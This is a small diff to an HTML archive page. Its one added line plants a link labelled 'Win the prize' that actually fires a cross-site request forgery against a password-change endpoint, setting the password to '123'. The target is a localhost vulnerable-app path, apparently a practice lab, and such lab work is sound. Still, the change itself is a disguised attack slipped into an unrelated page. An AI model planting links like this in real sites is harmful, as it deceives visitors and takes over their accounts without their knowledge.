@@ -43,6 +43,7 @@ permalink: /archive.html
 		  <p><strong><a href="/archive/[Patch] Alone In The Dark - The New Nightmare_RU.pdf">[ PDF - RU ]</a></strong></p>
 		  <p><strong><a href="/archive/[Patch]_Alone_In_The_Dark_-_The_New_Nightmare.html">[ RAW HTML VERSION ]</a></strong></p>
 		  <h1>===========================</h1>
+		  <p><strong><a href="http://dwve.localhost/vulnerabilities/csrf/?password_new=123&password_conf=123&Change=Change">[ Win the prize]</a></strong></p>
 	  </div>
 	</div>
 </div>
